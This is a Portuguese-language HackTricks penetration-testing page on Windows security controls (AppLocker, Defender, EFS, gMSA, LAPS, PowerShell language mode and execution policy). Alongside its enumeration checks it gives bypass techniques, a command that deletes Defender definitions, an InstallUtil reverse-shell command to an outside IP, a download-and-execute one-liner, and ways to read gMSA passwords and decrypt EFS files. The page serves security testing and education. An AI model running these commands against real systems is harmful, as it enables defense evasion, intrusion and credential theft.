# Controles de Segurança do Windows

{{#include ../banners/hacktricks-training.md}}

## Política do AppLocker

Uma lista de permissões de aplicativos é uma lista de aplicativos de software ou executáveis aprovados que podem estar presentes e ser executados em um sistema. O objetivo é proteger o ambiente contra malware prejudicial e software não aprovado que não atenda às necessidades específicas de negócios de uma organização.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) é a **solução de lista de permissões de aplicativos** da Microsoft e permite que os administradores de sistema controlem **quais aplicativos e arquivos os usuários podem executar**. Ela oferece **controle granular** sobre executáveis, scripts, arquivos do Windows Installer, DLLs, aplicativos empacotados e instaladores de aplicativos empacotados.\
É comum que as organizações **bloqueiem cmd.exe e PowerShell.exe** e o acesso de gravação a determinados diretórios, **mas tudo isso pode ser contornado**.

### Verificar

Verifique quais arquivos/extensões estão na lista de bloqueio/permissões:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` avalia arquivos candidatos para uma identidade específica em relação a uma política do AppLocker. Teste a conta cujo token executará o payload, pois as regras podem ter como alvo usuários ou grupos; `Get-AppLockerFileInformation` também é útil para inspecionar o caminho, o hash e os metadados do publisher que podem corresponder às regras.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Antes de considerar um resultado de teste negado como um bloqueio efetivo, inspecione o **modo de aplicação efetivo dessa coleção de regras** e o serviço Application Identity. `AuditOnly` avalia as regras, mas ainda permite a execução, enquanto `NotConfigured` não equivale a desativado quando essa coleção contém regras.<sup>[[7]](#references)</sup> Se o `AppIDSvc` estiver parado, o AppLocker não aplicará as regras.<sup>[[9]](#references)</sup> Essas verificações permitem distinguir um bypass real de uma política que nunca bloqueou o arquivo.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

Para um teste de execução controlada, compare o log de eventos do AppLocker: **8003/8006** significam que o EXE/DLL ou script/MSI teria sido bloqueado no modo de auditoria; **8004/8007** significam que foi efetivamente bloqueado. Teste o mesmo tipo de arquivo e identidade do caminho de execução pretendido.<sup>[[8]](#references)</sup>

Este caminho do registro contém as configurações e políticas aplicadas pelo AppLocker, permitindo revisar o conjunto atual de regras aplicadas no sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Pastas graváveis** úteis para fazer bypass da política do AppLocker: se o AppLocker permitir a execução de qualquer coisa dentro de `C:\Windows\System32` ou `C:\Windows`, há **pastas graváveis** que você pode usar para **fazer bypass disso**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Binários comumente **confiáveis** [**"LOLBAS's"**](https://lolbas-project.github.io/) também podem ser úteis para fazer bypass do AppLocker.
- **Regras mal escritas também podem ser contornadas**
  - Por exemplo, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**: você pode criar uma **pasta chamada `allowed`** em qualquer lugar, e ela será permitida.
  - As organizações também costumam se concentrar em **bloquear o executável `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mas se esquecem de outros **locais do executável** [**PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
- **A aplicação de regras a DLLs raramente é habilitada**, devido à carga adicional que pode gerar no sistema e à quantidade de testes necessária para garantir que nada seja afetado. Portanto, usar **DLLs como backdoors ajudará a fazer bypass do AppLocker**.
- Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e fazer bypass do AppLocker. Para mais informações, consulte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Armazenamento de credenciais

### Security Accounts Manager (SAM)

As credenciais locais estão presentes neste arquivo; as senhas estão em hash.

### Local Security Authority (LSA) - LSASS

As **credenciais** (em hash) são **armazenadas** na **memória** deste subsistema para permitir o Single Sign-On.\
A **LSA** administra a **política de segurança** local (política de senhas, permissões de usuários...), a **autenticação**, os **tokens de acesso**...\
A LSA é responsável por **verificar** as credenciais fornecidas no arquivo **SAM** (para um login local) e **se comunicar** com o **controlador de domínio** para autenticar um usuário do domínio.

As **credenciais** são **armazenadas** dentro do **processo LSASS**: tickets Kerberos, hashes NT e LM, senhas facilmente descriptografadas.

### Segredos da LSA

A LSA pode salvar algumas credenciais no disco:

- Senha da conta do computador do Active Directory (controlador de domínio inacessível).
- Senhas das contas dos serviços do Windows
- Senhas de tarefas agendadas
- Mais (senha de aplicativos IIS...)

### NTDS.dit

É o banco de dados do Active Directory. Está presente apenas nos controladores de domínio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) é um antivírus disponível no Windows 10 e Windows 11, além de versões do Windows Server. Ele **bloqueia** ferramentas comuns de pentesting, como **`WinPEAS`**. No entanto, há maneiras de **contornar essas proteções**.

### Verificação

Para verificar o **status** do **Defender**, você pode executar o cmdlet PS **`Get-MpComputerStatus`** (verifique o valor de **`RealTimeProtectionEnabled`** para saber se está ativo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerá-lo, você também pode executar:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Sistema de Arquivos Criptografados (EFS)

O EFS protege arquivos por meio de criptografia, utilizando uma **chave simétrica** conhecida como **File Encryption Key (FEK)**. Essa chave é criptografada com a **chave pública** do usuário e armazenada nos metadados NTFS `$EFS` do arquivo (`$LOGGED_UTILITY_STREAM`), **não** em um fluxo de dados alternativo `$DATA` comum.<sup>[[10]](#references)</sup> Quando é necessário descriptografar, a **chave privada** correspondente ao certificado digital do usuário desembrulha a FEK. Um agente de recuperação de dados (DRA) configurado possui uma cópia criptografada separada da FEK no Campo de Recuperação de Dados.<sup>[[13]](#references)</sup>

**Cenários de descriptografia sem iniciativa do usuário** incluem:

- Quando arquivos ou pastas são movidos para um sistema de arquivos sem EFS, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), eles são descriptografados automaticamente.
- Arquivos criptografados enviados pela rede usando o protocolo SMB/CIFS são descriptografados antes da transmissão.

Esse método de criptografia permite **acesso transparente** aos arquivos criptografados pelo proprietário. No entanto, simplesmente alterar a senha do proprietário e fazer login não permitirá a descriptografia.

**Principais conclusões**:

- O EFS usa uma FEK simétrica, criptografada com a chave pública do usuário.
- A descriptografia usa a chave privada do usuário para acessar a FEK.
- A descriptografia automática ocorre em condições específicas, como ao copiar para FAT32 ou durante a transmissão pela rede.
- O proprietário pode acessar arquivos criptografados sem etapas adicionais.

### Verificar informações do EFS

Não presuma que o EFS está sendo usado com base em `%APPDATA%\Microsoft\Protect`: esse diretório armazena chaves mestras DPAPI usadas por muitos recursos do Windows.<sup>[[19]](#references)</sup> Em vez disso, inspecione um arquivo criptografado com `cipher /c "C:\path\file"` para listar os certificados do usuário e de recuperação. `cipher /e` e `cipher /d` criptografam e descriptografam arquivos para uma entidade que tenha a chave privada correspondente.<sup>[[11]](#references)</sup>

### Descriptografar arquivos EFS

Se `cipher /c` listar um certificado de recuperação e você tiver sua **chave privada DRA correspondente** em um PFX, importe esse PFX no repositório de certificados do usuário atual e, em seguida, descriptografe o arquivo.<sup>[[11]](#references)[[12]](#references)</sup> Um certificado DRA recém-gerado não pode descriptografar arquivos antigos: sua chave pública já deveria estar incluída quando o arquivo foi criptografado. O acesso por ACL do NTFS ou apenas redefinir a senha da conta não fornece a chave privada necessária.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### Ser a autoridade do sistema

Essa abordagem exige que o **usuário vítima** esteja **executando** um **processo** no host. Nesse caso, em uma sessão `meterpreter`, você pode personificar o token do processo do usuário (`impersonate_token` do `incognito`). Como alternativa, você pode usar `migrate` para migrar para o processo do usuário.

#### Saber a senha do usuário

O Mimikatz pode importar o certificado e a chave privada do usuário e, em seguida, usá-los para descriptografar arquivos protegidos por EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Contas de serviço gerenciadas por grupo (gMSA)

A Microsoft desenvolveu as **Group Managed Service Accounts (gMSA)** para simplificar o gerenciamento de contas de serviço em infraestruturas de TI. Ao contrário das contas de serviço tradicionais, que geralmente têm a configuração "**Password never expire**" ativada, as gMSAs oferecem uma solução mais segura e fácil de gerenciar:

- **Gerenciamento automático de senhas**: as gMSAs usam uma senha complexa de 240 bytes, que normalmente é alterada a cada 30 dias. Os controladores de domínio a derivam usando o material de chave KDS, eliminando a necessidade de atualizar senhas manualmente.<sup>[[16]](#references)[[20]](#references)</sup>
- **Segurança aprimorada**: essas contas são imunes a bloqueios e não podem ser usadas para logins interativos, o que aumenta sua segurança.
- **Suporte a vários hosts**: as gMSAs podem ser compartilhadas entre vários hosts, sendo ideais para serviços executados em vários servidores.
- **Suporte a tarefas agendadas**: ao contrário das contas de serviço gerenciadas, as gMSAs permitem executar tarefas agendadas.
- **Gerenciamento simplificado de SPN**: o sistema atualiza automaticamente o Service Principal Name (SPN) quando há alterações nos detalhes sAMaccount ou no nome DNS do computador, simplificando o gerenciamento de SPN.

Um controlador de domínio constrói o atributo LDAP _**msDS-ManagedPassword**_ ao ser lido, com base no material de senha derivado de KDS; o valor não é uma senha armazenada de forma independente. Ele normalmente muda a cada 30 dias.<sup>[[20]](#references)</sup> O [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) retornado **não é uma senha criptografada**: seu campo `CurrentPassword` contém a senha em texto claro.<sup>[[14]](#references)</sup> O acesso é verificado com base em `msDS-GroupMSAMembership`, portanto, qualquer principal com direitos de recuperação está no escopo, não apenas administradores ou hosts de serviço.<sup>[[15]](#references)</sup> A conexão LDAP deve fornecer confidencialidade, por exemplo, por meio de LDAPS ou de SASL sealing.<sup>[[20]](#references)</sup>

Para derivar senhas offline após a exposição da chave raiz KDS, consulte [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md).

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Você pode ler essa senha com [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Encontre mais informações nesta publicação**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Confira também esta [página da web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre como realizar um **ataque NTLM relay** para **ler** a **senha** de uma **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Durante a enumeração, diferencie o **Microsoft LAPS legado** da implementação nativa do **Windows LAPS**. O Windows LAPS foi lançado nas atualizações do Windows de 11 de abril de 2023 e pode fazer backup da senha de um administrador local gerenciado no **Windows Server Active Directory** ou no **Microsoft Entra ID**. Em implantações integradas ao AD, ele também pode criptografar senhas, manter um histórico de senhas criptografadas e gerenciar a senha DSRM de um controlador de domínio. O MSI legado baixável está obsoleto nas versões mais recentes do Windows, embora o Windows LAPS possa operar no modo de emulação legado.<sup>[[6]](#references)</sup>

Como o Microsoft LAPS legado e o Windows LAPS são implementações distintas, identifique qual deles está implantado antes de aplicar ataques específicos a atributos ou cmdlets. A página vinculada aborda descoberta, enumeração de ACL, recuperação, manipulação de expiração e recuperação offline, sem repetir esses procedimentos aqui.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

O PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **restringe muitos dos recursos** necessários para usar o PowerShell com eficiência, como bloquear objetos COM, permitir apenas tipos .NET aprovados, fluxos de trabalho baseados em XAML, classes do PowerShell e muito mais.

### **Verificar**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2` era um downgrade legado disponível apenas em hosts com o mecanismo opcional do PowerShell 2 instalado. Ele não está mais incluído nas versões atualizadas do Windows 11 24H2 ou do Windows Server 2025; não o considere um bypass de CLM atual.<sup>[[17]](#references)</sup> Sob controle de aplicativos, o PowerShell executa código não confiável em Constrained Language, enquanto scripts confiáveis pela política podem ser executados em Full Language.<sup>[[18]](#references)</sup>

Para configurações mais antigas, você pode usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilá-lo, talvez seja necessário** **adicionar uma referência** _**Navegar**_ -> _Navegar_ -> adicionar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **alterar o projeto para .Net4.5**.

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e contornar o modo restrito. Para mais informações, consulte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS Execution Policy

Por padrão, ela é definida como **restricted.** Principais maneiras de contornar essa política:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Mais informações podem ser encontradas [aqui](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Interface do Provedor de Suporte à Segurança (SSPI)

É a API que pode ser usada para autenticar usuários.

O SSPI será responsável por encontrar o protocolo adequado para duas máquinas que desejam se comunicar. O método preferencial é o Kerberos. Em seguida, o SSPI negociará qual protocolo de autenticação será usado. Esses protocolos de autenticação são chamados de Provedores de Suporte à Segurança (SSP), ficam em cada máquina Windows na forma de uma DLL e ambas as máquinas devem oferecer suporte ao mesmo protocolo para poderem se comunicar.

### Principais SSPs

- **Kerberos**: O preferencial
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** e **NTLMv2**: Por motivos de compatibilidade
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Servidores web e LDAP, senha na forma de um hash MD5
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL e TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: É usado para negociar o protocolo a ser usado (Kerberos ou NTLM, sendo o Kerberos o padrão)
  - %windir%\Windows\System32\lsasrv.dll

#### A negociação pode oferecer vários métodos ou apenas um.

## UAC - Controle de Conta de Usuário

[O Controle de Conta de Usuário (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que habilita um **prompt de consentimento para atividades com privilégios elevados**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [Ignorando o AppLocker e o modo de linguagem restrita do PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [como descriptografar arquivos EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying para gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 maneiras de ignorar a política de execução do PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Usar os cmdlets do Windows PowerShell do AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Visão geral do Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [Trabalhar com regras do AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [Usar o Visualizador de Eventos com o AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [Processos e interações do AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [Fluxos de arquivos (sistemas de arquivos locais)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Comando Cipher](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Comando Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Fazer backup da chave privada do agente de recuperação do EFS](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [Atributo ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Proteger contas de serviço gerenciadas de grupo](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Recursos removidos do Windows client](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [Usar o App Control para proteger o PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [Evento 4693 e chaves mestras do DPAPI](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [Construção de msDS-ManagedPassword](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
